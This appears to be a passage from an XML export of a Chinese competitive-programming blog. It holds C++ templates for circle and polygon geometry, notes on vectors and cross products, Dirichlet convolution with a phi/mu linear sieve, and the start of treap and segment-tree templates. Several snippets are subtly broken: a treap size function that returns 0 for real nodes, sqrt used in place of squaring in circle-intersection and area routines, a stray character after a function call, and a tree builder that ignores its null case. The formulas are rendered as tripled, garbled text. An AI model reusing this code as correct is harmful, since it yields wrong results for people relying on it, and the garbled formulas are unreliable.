&#123; Point c; double r; Circle() &#123;&#125; Circle(Point c, double r):c(c), r(r) &#123;&#125; inline Point point(double a) //根据圆心角求点坐标 &#123; return Point(c.x+cos(a)*r, c.y+sin(a)*r); &#125; inline void read() &#123; scanf("%lf%lf%lf", &amp;c.x, &amp;c.y, &amp;r); &#125;&#125;;//求a点到b点(逆时针)在的圆上的圆弧长度double DisOnCircle(Point a, Point b, Circle C)&#123; double ang1 = angle(a - C.c); double ang2 = angle(b - C.c); if (ang2 &lt; ang1) ang2 += 2 * PI; return C.r * (ang2 - ang1);&#125;//直线与圆交点 返回个数int getLineCircleIntersection(Line L, Circle C, double&amp; t1, double&amp; t2, std::vector&lt;Point&gt;&amp; sol)&#123; double a = L.v.x, b = L.p.x - C.c.x, c = L.v.y, d = L.p.y - C.c.y; double e = a*a + c*c, f = 2*(a*b + c*d), g = b*b + d*d - C.r*C.r; double delta = f*f - 4*e*g; // 判别式 if(dcmp(delta) &lt; 0) return 0; // 相离 if(dcmp(delta) == 0) &#123; // 相切 t1 = t2 = -f / (2 * e); sol.push_back(L.point(t1)); return 1; &#125; // 相交 t1 = (-f - sqrt(delta)) / (2 * e); sol.push_back(L.point(t1)); t2 = (-f + sqrt(delta)) / (2 * e); sol.push_back(L.point(t2)); return 2;&#125;//两圆交点 返回个数int getCircleCircleIntersection(Circle C1, Circle C2, std::vector&lt;Point&gt;&amp; sol)&#123; double d = Length(C1.c - C2.c); if(dcmp(d) == 0) &#123; if(dcmp(C1.r - C2.r) == 0) return -1; // 重合，无穷多交点 return 0; &#125; if(dcmp(C1.r + C2.r - d) &lt; 0) return 0; if(dcmp(fabs(C1.r-C2.r) - d) &gt; 0) return 0; double a = angle(C2.c - C1.c); double da = acos((C1.r*C1.r + d*d - C2.r*C2.r) / (2*C1.r*d)); Point p1 = C1.point(a-da), p2 = C1.point(a+da); sol.push_back(p1); if(p1 == p2) return 1; sol.push_back(p2); return 2;&#125;// 过点p到圆C的切线。v[i]是第i条切线的向量。返回切线条数int getTangents(Point p, Circle C, Vector* v)&#123; Vector u = C.c - p; double dist = Length(u); if(dist &lt; C.r) return 0; else if(dcmp(dist - C.r) == 0) // p在圆上，只有一条切线 &#123; v[0] = Rotate(u, PI/2); return 1; &#125; else &#123; double ang = asin(C.r / dist); v[0] = Rotate(u, -ang); v[1] = Rotate(u, +ang); return 2; &#125;&#125;//两圆的公切线, -1表示无穷条切线//返回切线的条数, -1表示无穷条切线//a[i]和b[i]分别是第i条切线在圆A和圆B上的切点int getTangents(Circle A, Circle B, Point* a, Point* b)&#123; int cnt = 0; if (A.r &lt; B.r) std::swap(A, B), std::swap(a, b); ///**************************** int d2 = (A.c.x - B.c.x) * (A.c.x - B.c.x) + (A.c.y - B.c.y) * (A.c.y - B.c.y); int rdiff = A.r - B.r; int rsum = A.r + B.r; if (d2 &lt; rdiff * rdiff) return 0; //内含 ///*************************************** double base = atan2(B.c.y - A.c.y, B.c.x - A.c.x); if (d2 == 0 &amp;&amp; A.r == B.r) return -1; //无线多条切线 if (d2 == rdiff * rdiff) //内切, 1条切线 &#123; ///********************** a[cnt] = A.point(base); b[cnt] = B.point(base); cnt++; return 1; &#125; //有外公切线 double ang = acos((A.r - B.r) / sqrt(d2 * 1.0)); a[cnt] = A.point(base + ang); b[cnt] = B.point(base + ang); cnt++; a[cnt] = A.point(base - ang); b[cnt] = B.point(base - ang); cnt++; if (d2 == rsum * rsum) //一条内公切线 &#123; a[cnt] = A.point(base); b[cnt] = B.point(PI + base); cnt++; &#125; else if (d2 &gt; rsum * rsum) //两条内公切线 &#123; double ang = acos((A.r + B.r) / sqrt(d2 * 1.0)); a[cnt] = A.point(base + ang); b[cnt] = B.point(PI + base + ang); cnt++; a[cnt] = A.point(base - ang); b[cnt] = B.point(PI + base - ang); cnt++; &#125; return cnt;&#125;// 过点p到圆C的切点int getTangentPoints(Point p, Circle C, std::vector&lt;Point&gt;&amp; v)&#123; Vector u = C.c - p; double dist = Length(u); if(dist &lt; C.r) return 0; else if(dcmp(dist - C.r) == 0) // p在圆上，只有一条切线 &#123; v.push_back(p); return 1; &#125; else &#123; double ang = asin(C.r / dist); double d = sqrt(dist * dist - C.r * C.r); v.push_back(p + Unit(Rotate(u, -ang)) * d); v.push_back(p + Unit(Rotate(u, +ang)) * d); return 2; &#125;&#125;//圆A与圆B的切点void getTangentPoints(Circle A, Circle B, std::vector&lt;Point&gt;&amp; a)&#123; if (A.r &lt; B.r) std::swap(A, B); ///**************************** int d2 = sqrt(A.c.x - B.c.x) + sqrt(A.c.y - B.c.y); int rdiff = A.r - B.r, rsum = A.r + B.r; if (d2 &lt; rdiff * rdiff) return; //内含 ///*************************************** double base = atan2(B.c.y - A.c.y, B.c.x - A.c.x); if (d2 == 0 &amp;&amp; A.r == B.r) return; //无线多条切线 if (d2 == rdiff * rdiff) //内切, 1条切线 &#123; ///********************** a.push_back(A.point(base)); a.push_back(B.point(base)); return; &#125; //有外公切线 double ang = acos((A.r - B.r) / sqrt(d2 * 1.0)); a.push_back(A.point(base + ang)); a.push_back(B.point(base + ang)); a.push_back(A.point(base - ang)); a.push_back(B.point(base - ang)); if (d2 == rsum * rsum) //一条内公切线 &#123; a.push_back(A.point(base)); a.push_back(B.point(PI + base)); &#125; else if (d2 &gt; rsum * rsum) //两条内公切线 &#123; double ang = acos((A.r + B.r) / sqrt(d2 * 1.0)); a.push_back(A.point(base + ang)); a.push_back(B.point(PI + base + ang)); a.push_back(A.point(base - ang)); a.push_back(B.point(PI + base - ang)); &#125;&#125;//三角形外接圆Circle CircumscribedCircle(Point p1, Point p2, Point p3)&#123; double Bx = p2.x-p1.x, By = p2.y-p1.y; double Cx = p3.x-p1.x, Cy = p3.y-p1.y; double D = 2*(Bx*Cy-By*Cx); double cx = (Cy*(Bx*Bx+By*By) - By*(Cx*Cx+Cy*Cy))/D + p1.x; double cy = (Bx*(Cx*Cx+Cy*Cy) - Cx*(Bx*Bx+By*By))/D + p1.y; Point p = Point(cx, cy); return Circle(p, Length(p1-p));&#125;//三角形内切圆Circle InscribedCircle(Point p1, Point p2, Point p3)&#123; double a = Length(p2-p3); double b = Length(p3-p1); double c = Length(p1-p2); Point p = (p1*a+p2*b+p3*c)/(a+b+c); return Circle(p, DistanceToLine(p, p1, p2));&#125;//所有经过点p 半径为r 且与直线L相切的圆心std::vector&lt;Point&gt; CircleThroughPointTangentToLineGivenRadius(Point p, Line L, double r)&#123; std::vector&lt;Point&gt; ans; double t1, t2; getLineCircleIntersection(L.move(-r), Circle(p, r), t1, t2, ans); getLineCircleIntersection(L.move(r), Circle(p, r), t1, t2, ans); return ans;&#125;//半径为r 与a b两直线相切的圆心std::vector&lt;Point&gt; CircleTangentToLinesGivenRadius(Line a, Line b, double r)&#123; std::vector&lt;Point&gt; ans; Line L1 = a.move(-r), L2 = a.move(r); Line L3 = b.move(-r), L4 = b.move(r); ans.push_back(GetLineIntersection(L1, L3)); ans.push_back(GetLineIntersection(L1, L4)); ans.push_back(GetLineIntersection(L2, L3)); ans.push_back(GetLineIntersection(L2, L4)); return ans;&#125;//与两圆相切 半径为r的所有圆心std::vector&lt;Point&gt; CircleTangentToTwoDisjointCirclesWithRadius(Circle c1, Circle c2, double r)&#123; std::vector&lt;Point&gt; ans; Vector v = c2.c - c1.c; double dist = Length(v); int d = dcmp(dist - c1.r -c2.r - r*2); if(d &gt; 0) return ans; getCircleCircleIntersection(Circle(c1.c, c1.r+r), Circle(c2.c, c2.r+r), ans); return ans;&#125;//多边形与圆相交面积Point GetIntersection(Line a, Line b) //线段交点&#123; Vector u = a.p-b.p; double t = Cross(b.v, u) / Cross(a.v, b.v); return a.p + a.v*t;&#125;inline bool InCircle(Point x, Circle c)&#123; return dcmp(c.r - Length(c.c - x)) &gt;= 0;&#125;inline bool OnCircle(Point x, Circle c)&#123; return dcmp(c.r - Length(c.c - x)) == 0;&#125;//线段与圆的交点int getSegCircleIntersection(Line L, Circle C, Point* sol)&#123; Vector nor = Normal(L.v); Line pl = Line(C.c, nor); Point ip = GetIntersection(pl, L); double dis = Length(ip - C.c); if (dcmp(dis - C.r) &gt; 0) return 0; Point dxy = Unit(L.v) * sqrt(sqrt(C.r) - sqrt(dis)); int ret = 0; sol[ret] = ip + dxy; if (OnSegment(sol[ret], L.p, L.point(1))) ret++; sol[ret] = ip - dxy; if (OnSegment(sol[ret], L.p, L.point(1))) ret++; return ret;&#125;//线段切割圆double SegCircleArea(Circle C, Point a, Point b)&#123; double a1 = angle(a - C.c); double a2 = angle(b - C.c); double da = fabs(a1 - a2); if (da &gt; PI) da = PI * 2.0 - da; return dcmp(Cross(b - C.c, a - C.c)) * da * sqrt(C.r) / 2.0;&#125;//多边形与圆相交面积double PolyCiclrArea(Circle C, Point *p, int n)&#123; double ret = 0.0; Point sol[2]; p[n] = p[0]; //REP(i, n) for(int i=1;i&lt;=n;i++) &#123; //double t1, t2; int cnt = getSegCircleIntersection(Line(p[i], p[i+1]-p[i]), C, sol); if (cnt == 0) &#123; if (!InCircle(p[i], C) || !InCircle(p[i+1], C)) ret += SegCircleArea(C, p[i], p[i+1]); else ret += Cross(p[i+1] - C.c, p[i] - C.c) / 2.0; &#125; if (cnt == 1) &#123; if (InCircle(p[i], C) &amp;&amp; !InCircle(p[i+1], C)) ret += Cross(sol[0] - C.c, p[i] - C.c) / 2.0, ret += SegCircleArea(C, sol[0], p[i+1]); else ret += SegCircleArea(C, p[i], sol[0]), ret += Cross(p[i+1] - C.c, sol[0] - C.c) / 2.0; &#125; if (cnt == 2) &#123; if ((p[i] &lt; p[i + 1]) ^ (sol[0] &lt; sol[1])) std::swap(sol[0], sol[1]); ret += SegCircleArea(C, p[i], sol[0]); ret += Cross(sol[1] - C.c, sol[0] - C.c) / 2.0; ret += SegCircleArea(C, sol[1], p[i+1]); &#125; &#125; return fabs(ret);&#125;double area(std::vector&lt;Point&gt;p) //计算凸包的面积&#123; double ans = 0; int sz = p.size(); for (int i = 1; i &lt; sz - 1; i++) ans += Cross(p[i] - p[0], p[i + 1] - p[0]); return ans / 2.0;&#125;double seg(Point o, Point a, Point b)&#123; if (dcmp(b.x - a.x) == 0) return (o.y - a.y) / (b.y - a.y); return (o.x - a.x) / (b.x - a.x);&#125;std::vector&lt;Point&gt; pp[110];std::pair&lt;double, int&gt; s[2000200];double polyunion(std::vector&lt;Point&gt;*p, int n)//求n个多凸包的面积交&#123; double ret = 0; for (int i = 0; i &lt; n; i++) &#123; int sz = p[i].size(); for (int j = 0; j &lt; sz; j++) &#123; int m = 0; s[m++] = mp(0, 0); s[m++] = mp(1, 0); Point a = p[i][j], b = p[i][(j + 1) % sz]; for (int k = 0; k &lt; n; k++) &#123; if (i != k) &#123; int siz = p[k].size(); for (int ii = 0; ii &lt; siz; ii++) &#123; Point c = p[k][ii], d = p[k][(ii + 1) % siz]; int c1 = dcmp(Cross(b - a, c - a)); int c2 = dcmp(Cross(b - a, d - a)); if (c1 == 0 &amp;&amp; c2 == 0) &#123; if (dcmp(Dot(b - a, d - c)) &gt; 0 &amp;&amp; i &gt; k) &#123; s[m++] = mp(seg(c, a, b), 1); s[m++] = mp(seg(d, a, b), -1); &#125; &#125; else &#123; double s1 = Cross(d - c, a - c); double s2 = Cross(d - c, b - c); if (c1 &gt;= 0 &amp;&amp; c2 &lt; 0) s[m++] = mp(s1 / (s1 - s2), 1); else if (c1 &lt; 0 &amp;&amp; c2 &gt;= 0) s[m++] = mp(s1 / (s1 - s2), -1); &#125; &#125; &#125; &#125; sort(s, s + m); double pre = std::min(std::max(s[0].first, 0.0), 1.0), now; double sum = 0; int cov = s[0].second; for (int j = 1; j &lt; m; j++) &#123; now = std::min(std::max(s[j].first, 0.0), 1.0); if (!cov) sum += now - pre; cov += s[j].second; pre = now; &#125; ret += Cross(a, b)*sum; &#125; &#125; return ret / 2;&#125;int Main()&#123; double x1,x2,x3,x4,y1,y2,y3,y4; while (~scanf("%lf%lf%lf%lf",&amp;x1,&amp;y1,&amp;x2,&amp;y2))&#123; scanf("%lf%lf%lf%lf",&amp;x3,&amp;y3,&amp;x4,&amp;y4); pp[0].clear(); pp[1].clear(); pp[0].pb(Point(x1,y1)); pp[0].pb(Point(x1,y2)); pp[0].pb(Point(x2,y1)); pp[0]=ConvexHull(pp[0]);// for(int i=0;i&lt;pp[0].size();i++)&#123;// printf("%lf %lf\n",pp[0][i].x,pp[0][i].y);// &#125;puts("-----"); pp[1].pb(Point(x3,y3)); pp[1].pb(Point(x3,y4)); pp[1].pb(Point(x4,y3)); pp[1].pb(Point(x4,y4)); pp[1]=ConvexHull(pp[1]);// for(int i=0;i&lt;pp[1].size();i++)&#123;// printf("%lf %lf\n",pp[1][i].x,pp[1][i].y);// &#125;puts("-----"); double t1 = area(pp[0]) + area(pp[1]); double t2 = polyunion(pp, 2); printf("%.10lf\n",t1-t2); &#125; return 0;&#125;int main()&#123;#ifndef ONLINE_JUDGE freopen("asdf.in" ,"r",stdin ); freopen("asdf.out","w",stdout); double _time_tabris=clock();#endif // ONLINE_JUDGE Main();w#ifndef ONLINE_JUDGE printf("time: %lf\n",clock()-_time_tabris);#endif //ONLINE_JUDGE return 0;&#125;就写到这里了Shq′sBlog\mathfrak {Shq&#x27;s \; Blog}Shq​′​​sBlog]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>几何</tag>
        <tag>模板</tag>
        <tag>凸包</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「笔记」计算几何笔记]]></title>
    <url>%2Farticles%2FComputational-geometry1%2F</url>
    <content type="text"><![CDATA[本篇是关于计算几何知识的一些总结精度控制计算几何经常牵扯到浮点数的运算，所以就会产生精度误差，因此我们需要设置一个eps（偏差值），一般取10−710^{-7}10​−7​​到10−1010^{-10}10​−10​​之间，并用下面的函数控制精度。123456const double eps=1e-8; int dcmp(double x) &#123; if (fabs(x)&lt;eps) return 0; else return x&lt;0?-1:1; &#125;向量有大小有方向的量，又称为矢量。二维的向量常用一个对数(x,y)(x,y)(x,y)表示，代码中常用一个结构体来实现向量1234567struct Vector &#123; double x, y; Vector(double _x, double _y) &#123; x = _x; y = _y; &#125;&#125;;向量的模,即向量的长度123double len(vector a) &#123; return sqrt(a.x * a.x + a.y * a.y) &#125;二维平面中的点，同样可以用对数(x,y)(x,y)(x,y)来表示，所以向量的存储方式同样可以用于点1typedef vector point;需要注意的是（1）点加减向量为点（2）点减点为向量极角对于向量，可以用函数atan2(y,x)atan2(y,x)atan2(y,x)来计算他的极角按照极角为关键字排序后的顺序为极角序向量的四则运算Code:1234vector operator + (vector a, vector b) &#123;return vector (a.x + b.x,a.y + b.y);&#125; vector operator - (vector a, vector b) &#123;return vector (a.x - b.x,a.y - b.y);&#125; vector operator * (vector a, double p) &#123;return vector (a.x * p,a.y * p); &#125; vector operator / (vector a. double p) &#123;return vector (a.x / p,a.y / p); &#125;点积的几何意义为aaa在bbb上的投影长度乘以bbb的模长其中为a,ba,ba,b之间的夹角坐标表示Code:123double dot(vector a, vector b) &#123; return a.x * b.x + a.y * b.y; &#125;点积的应用（1）判断两个向量是否垂直（2）求两个向量的夹角，点积&lt;0\lt 0&lt;0为钝角，点积&gt;0\gt 0&gt;0为锐角（3）求模长Code:1234567double Angle(vector a, vector b) &#123; return acos(dot(a, b) / len(a) / len(b)); &#125; double len(vector a) &#123; return sqrt(dot(a, a)); &#125;法向量与单位向量垂直的向量称为单位法向量Code:1234vector normal(vector a) &#123; double l = len(a); return vector (-a.y / l, a.x / l); &#125;二维叉积两个向量的叉积是一个标量，的几何意义为他们所形成的平行四边形的有向面积坐标表示Code :123double cross(vector a, vector b) &#123; return a.x * b.y - a.y * b.x; &#125;直观理解，假如b在a的左边，则有向面积为正，假如在右边则为负。假如b,a共线，则叉积为0,。所以叉积可以用来判断平行向量的旋转a=(x,y)可以看成是x(1,0)+y1(0,1)分别旋转两个单位向量，则变成，，点、直线、线段的关系点到直线的距离利用叉积求面积，然后除以平行四边形的底边长，得到平行四边形的高即点到直线的距离Code:1234double distl(point p, point a, point b) &#123; vector v = p - a; vector u = b - a; return fabs(cross(v, u)) / len(u); &#125;点到线段的距离比点到直线的距离稍微复杂。因为是线段，所以如果平行四边形的高在区域之外的话就不合理，这时候需要计算点到距离较近的端点的距离Code:1234567double dists(point p, point a, point b) &#123; if (a == b) return len(p - a); vector v1 = b - a, v2 = p - a, v3 = p - b; if (dcmp(dot(v1, v2)) &lt; 0) return len(v2); else if (dcmp(dot(v1, v3)) &gt; 0) return len(v3); return fabs(cross(v1, v2)) / len(v1); &#125;判断两线段相交跨立实验:判断一条线段的两端是否在另一条线段的两侧（两个端点与另一线段的叉积乘积为负）。需要正反判断两侧。Code:12345bool segment(point a, point b, point c, point d) &#123; double c1 = cross(b - a, c - a), c2 = cross(b - a, d - a); double d1 = cross(d - c, a - c), d2 = cross(d - c, b - c); return dcmp(c1) * dcmp(c2) &lt; 0 &amp;&amp; dcmp(d1) * dcmp(d2) &lt; 0; &#125;求两直线的交点有两种方法，比较常用的一种是用叉积的比值计算。但是这种方法的精度不是很高。Code:123456point glt(point a, point a1, point b, point b1) &#123; vector v = a1 - a; vector w = b1 - b; vector u = a - b; double t = cross(w, u) / cross(v, w); return a + v * t; &#125;还有一种比较麻烦，不常用但是精度相对较好:Code:1234567891011point line_intersection(point a, point a0, point b, point b0) &#123; double a1, b1, c1, a2, b2, c2; a1 = a.y - a0.y; b1 = a0.x - a.x; c1 = cross(a,a0); a2 = b.y - b0.y; b2 = b0.x - b.x; c2 = cross(b,b0); double d = a1 * b2 - a2 * b1; return point((b1 * c2 - b2 * c1) / d,(c1 * a2 - c2 * a1) / d); &#125;判断点在多边形内部射线法：以该点为起点引一条射线，与多边形的边界相交奇数次，说明在多边形的内部12345678910111213int pointin(point p, point* a, int n) &#123; int wn = 0, k, d1, d2; for (int i = 1; i &lt;= n; i++) &#123; if (dcmp(dists(p, a[i], a[(i + 1 - 1) % n + 1])) == 0) return -1;//判断点是否在多边形的边界上 k = dcmp(cross(a[(i + 1 - 1) % n + 1] - a[i], p - a[i])); d1 = dcmp(a[i].y - p.y); d2 = dcmp(a[(i + 1 - 1) % n + 1].y - p.y); if (k &gt; 0 &amp;&amp; d1 &lt;= 0 &amp;&amp; d2 &gt; 0) wn++; if (k &lt; 0 &amp;&amp; d2 &lt;= 0 &amp;&amp; d1 &gt; 0) wn--; &#125; if (wn) return 1; else return 0; &#125;求多边形的重心同样方法将多边形三角剖分算出每个三角形的重心套用质点组的重心公式即可质点组重心公式 三个点A,B,CA,B,CA,B,Cx=ma×xa+mb×xb+mc×xcma+mb+mcx = {m_a \times x_a + m_b \times x_b + m_c \times x_c \over m_a + m_b + m_c}x=​m​a​​+m​b​​+m​c​​​​m​a​​×x​a​​+m​b​​×x​b​​+m​c​​×x​c​​​​y=ma×ya+mb×yb+mc×ycma+mb+mcy={m_a \times y_a + m_b \times y_b+m_c \times y_c \over m_a + m_b + m_c}y=​m​a​​+m​b​​+m​c​​​​m​a​​×y​a​​+m​b​​×y​b​​+m​c​​×y​c​​​​mmm表示权，三角形的有向面积就写到这里了Shq′sBlog\mathfrak {Shq's \; Blog}Shq​′​​sBlog]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>计算几何</tag>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>向量</tag>
        <tag>极角</tag>
        <tag>叉积</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[狄利克雷(Dirichle)卷积]]></title>
    <url>%2Farticles%2FDirichle-product%2F</url>
    <content type="text"><![CDATA[狄利克雷(Dirichle)卷积是一种十分玄学的算法，常常用在各种数论算法中定义先来看f,gf, gf,g两个函数定义f,gf, gf,g两个函数的狄利克雷卷积(∗)( \; \ast \; )(∗)运算为：(f∗g)(n)=∑d∣nf(d)g(nd)(f \ast g)(n) = \sum_{d | n} f(d) g(\frac n d)(f∗g)(n)=​d∣n​∑​​f(d)g(​d​​n​​)性质狄利克雷卷积的性质：交换律： f∗g=g∗ff \ast g = g \ast ff∗g=g∗f结合律： (f∗g)∗h=f∗(g∗h)(f \ast g) \ast h = f \ast (g \ast h)(f∗g)∗h=f∗(g∗h)分配律： f∗(g+h)=f∗g+f∗hf \ast (g + h) = f \ast g + f \ast hf∗(g+h)=f∗g+f∗h单位元： f∗e=e∗ff \ast e = e \ast ff∗e=e∗f若f,gf, gf,g 为积性函数，那么f∗gf \ast gf∗g也为积性函数常见卷积常见的狄利克雷卷积：d(n)=∑d∣n1⇒d=1∗1d(n)=\sum_{d|n}1 \Rightarrow d=1*1d(n)=​d∣n​∑​​1⇒d=1∗1σ(n)=∑d∣nd⇒σ=d∗1\sigma(n)=\sum_{d|n}d \Rightarrow \sigma=d*1σ(n)=​d∣n​∑​​d⇒σ=d∗1证明证明：因为则那么根据反演可得ϵ(n)=∑d∣nμ(d)⇒ϵ=μ∗1\epsilon(n)=\sum_{d|n}\mu(d) \Rightarrow \epsilon=\mu*1ϵ(n)=​d∣n​∑​​μ(d)⇒ϵ=μ∗1令表示的不同的质因子数，可得通过二项式展开可得将代入可得所以只有当即时，，否则所以计算i=1i=1i=1, iii是质数和 i%p[j]≠0i \% p[j] \neq 0i%p[j]≠0 的情况很好求对于i%p[j]=0i \% p[j] = 0i%p[j]=0,可以通过分析增加一个最小质因子后的变化，或者直接考虑f(pk)f(pk)f(pk)f(pk)f(pk)f(pk)怎么求，反正积性函数不同质因子都是互质乘起来就行了不影响也可以筛出最小质因子的次数，分解成f(n)=f(pk)f(npk)f(n)=f(pk)f(npk)f(n)=f(pk)f(npk)f(n)=f(pk)f(npk)f(n)=f(pk)f(npk)f(n)=f(pk)f(npk)，对于f(pk)f(pk)f(pk)f(pk)f(pk)f(pk)考虑如何计算，带有约数和的可以考虑展开一些非积性函数也可以通过分析函数的性质也可以用线性筛来求例：欧拉函数可以直接根据公式得到如何处理φ(n)=n∏pi−1pi=∏(pi−1)∗piei−1\varphi(n) = n\prod\frac{p_i-1}{p_i} = \prod{(p_i-1)*p_i^{e_i-1}}φ(n)=n∏​p​i​​​​p​i​​−1​​=∏(p​i​​−1)∗p​i​e​i​​−1​​Code:123456789101112131415161718192021222324252627// from: Mzwuzad's Blog// 在求线性筛的同时求phi &amp;&amp; mustd::vector&lt;int&gt; p;bool is_prime[N_MAX];int phi[N_MAX], mu[N_MAX];void sieve(int n) &#123; memset(is_prime, true, sizeof(is_prime)); is_prime[1] = false, phi[1] = 1, mu[1] = 1; for (int i = 2; i &lt;= n; i++) &#123; if (is_prime[i]) &#123; p.push_back(i); phi[i] = i - 1; mu[i] = -1; &#125; for (int j = 0; j &lt; p.size() &amp;&amp; i * p[j] &lt;= n; j++) &#123; is_prime[i * p[j]] = false; if (!(i % p[j])) &#123; phi[i * p[j]] = phi[i] * p[j]; mu[i * p[j]] = 0; break; &#125; phi[i * p[j]] = phi[i] * (p[j] - 1); mu[i * p[j]] = -mu[i]; &#125; &#125;&#125;先写到这吧Shq′sBlog\mathfrak {Shq's \; Blog}Shq​′​​sBlog]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>数学</tag>
        <tag>数论</tag>
        <tag>初等数论</tag>
        <tag>卷积</tag>
        <tag>莫比乌斯反演</tag>
        <tag>欧拉筛</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「模板」一些树的模板]]></title>
    <url>%2Farticles%2Fmoban%2F</url>
    <content type="text"><![CDATA[这是是一些树型结构的模板已江这些树封装在一个结构体中123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571#include &lt;algorithm&gt;#include &lt;iostream&gt;#include &lt;cstring&gt;#include &lt;cstdio&gt;#include &lt;vector&gt;#include &lt;queue&gt;#include &lt;stack&gt;#include &lt;set&gt;#include &lt;map&gt;const int MAXN = 100010;const int INT_MAX = (1 &lt;&lt; 31) - 1;const int INT_MIN = -(1 &lt;&lt; 31) + 1;inline int max(int l, int r) &#123; return l &gt; r ? l : r;&#125;inline int min(int l, int r) &#123; return l &lt; r ? l : r;&#125;inline void spaw(int &amp;l, int &amp;r)&#123; l ^= r ^= l ^= r;&#125;struct Treap &#123; struct Node &#123; Node *left; Node *right; int fix, key, size; Node(int _key): fix(rand()) , key(_key) , left(NULL) , right(NULL) , size(1) &#123;&#125; inline void update() &#123; size = 1 + (left ? left-&gt;size : 0) + (right ? right-&gt;size : 0); &#125; &#125;; Node* root; typedef std::pair&lt;Node *, Node *&gt; Droot; inline int Size(Node *root) &#123; if (root) return 0; return root-&gt;size; &#125; Node *Merge(Node *begin, Node *end) &#123; if (!begin) return end; if (!end) return begin; if (begin-&gt;fix &gt; end-&gt;fix) &#123; end-&gt;left = Merge(begin, end-&gt;left); end-&gt;update(); return end; &#125; if (begin-&gt;fix &lt; end-&gt;fix) &#123; begin-&gt;right = Merge(begin-&gt;right, end); begin-&gt;update(); return begin; &#125; return begin; &#125; Droot Split(Node *root, int k) &#123; if (!root) return Droot(NULL, NULL); Droot answer; if (Size(root-&gt;left) &gt;= k) &#123; answer = Split(root-&gt;left, k); root-&gt;left = answer.second; root-&gt;update(); answer.second = root; &#125; if (Size(root-&gt;left) &lt; k) &#123; answer = Split(root-&gt;right, k - Size(root-&gt;left) - 1); root-&gt;right = answer.first; root-&gt;update(); answer.first = root; &#125; return answer; &#125; Node *Build(int *array) &#123; static Node *stack[MAXN]; static Node *node, *last; int tot = 0, cnt = 0; for (int i = 0; i &lt; array[0]; i++, cnt++) &#123; node = new Node(array[i]); last = NULL; while (tot &amp;&amp; stack[tot]-&gt;fix &gt; node-&gt;fix) &#123; stack[tot]-&gt;update(); last = stack[tot]; stack[tot--] = NULL; &#125; if (tot) stack[tot]-&gt;right = node; node-&gt;left = last; stack[++tot] = node; &#125; while (tot) stack[tot--]-&gt;update(); return stack[cnt]; &#125; int Findkth(int num) &#123; Droot first = Split(root, num - 1); Droot end = Split(first.second, 1); Node *ans = end.first; root = Merge(Merge(first.first,ans), end.second); return ans-&gt;key; &#125; int Getkth(Node *root, int v) &#123; if(!root) return 0; return v &lt; root-&gt;key ? Getkth(root-&gt;left, v) : Getkth(root-&gt;right, v) + Size(root-&gt;left) + 1; &#125; void Insert(int v) &#123; int k = Getkth(root,v); Droot x = Split(root,k); Node *n = new Node(v); root = Merge(Merge(x.first, n) , x.second); &#125; void Delete(int k) &#123; Droot first = Split(root, k - 1); Droot end = Split(first.second, 1); root=Merge(first.first, end.second); &#125;&#125;;struct SegmentTree &#123; int left, right, sum, tag; SegmentTree *lc, *rc; SegmentTree(int left, int right, SegmentTree *lc, SegmentTree *rc) : left(left), right(right), sum(0), tag(0), lc(lc), rc(rc) &#123;&#125; static SegmentTree *build(int l,int r) &#123; int mid = (l + r) &gt;&gt; 1; return l == r ? new SegmentTree(l, r, NULL, NULL) : new SegmentTree(l, r, build(l,mid), build(mid + 1, r)); &#125; void cover(int delta) &#123; sum += delta * (right - left + 1); tag += delta; &#125; void pushDown() &#123; if(tag)&#123; lc-&gt;cover(tag); rc-&gt;cover(tag); tag = 0; &#125; &#125; void modify(int l, int r, int delta) &#123; if(l &gt; right || r &lt; left) return; else if(l &lt;= left &amp;&amp; r &gt;= right) cover(delta); else&#123; pushDown(); lc-&gt;modify(l, r, delta); rc-&gt;modify(l, r, delta); sum = lc-&gt;sum + rc-&gt;sum; &#125; &#125; int query(int l, int r) &#123; if(l &gt; right || r &lt; left) return 0; else if(l &lt;= left &amp;&amp; r &gt;= right) return sum; else return pushDown(), lc-&gt;query(l, r) + rc-&gt;query(l, r); &#125;&#125;;struct BinaryTree &#123; struct Node &#123; int key; Node *left, *right; &#125;; Node *build(Node *root)&#123; int data; scanf("%d", &amp;data); if (data == 0) root = NULL; root = new Node; root-&gt;key = data; root-&gt;left = build(root-&gt;left); root-&gt;right = build(root-&gt;right); return root; &#125; int deepth(Node *root)&#123; if (root == NULL) return 0; else return max(deepth(root-&gt;left), deepth(root-&gt;right)) + 1; &#125; void cengxv(Node *root)&#123; std::queue&lt;Node *&gt; Q; Node *temp = NULL; if (root == NULL) return; Q.push(root); while (!Q.empty())&#123; temp = Q.front(); Q.pop(); printf("%d ", temp-&gt;key); if (temp-&gt;left != NULL) Q.push(temp-&gt;left); if (temp-&gt;right != NULL) Q.push(temp-&gt;right); &#125; &#125;&#125;;struct SearchBinaryTree &#123; struct Node &#123; int key; Node *left, *right; &#125;; bool valueInsert(Node *root, Node *node)&#123; if (root == NULL) &#123; root = node; return true; &#125; if (root-&gt;key &gt; node-&gt;key) return valueInsert(root-&gt;left, node); if (root-&gt;key &lt; node-&gt;key) return valueInsert(root-&gt;right, node); return false; &#125; bool Insert(Node* root, int key) 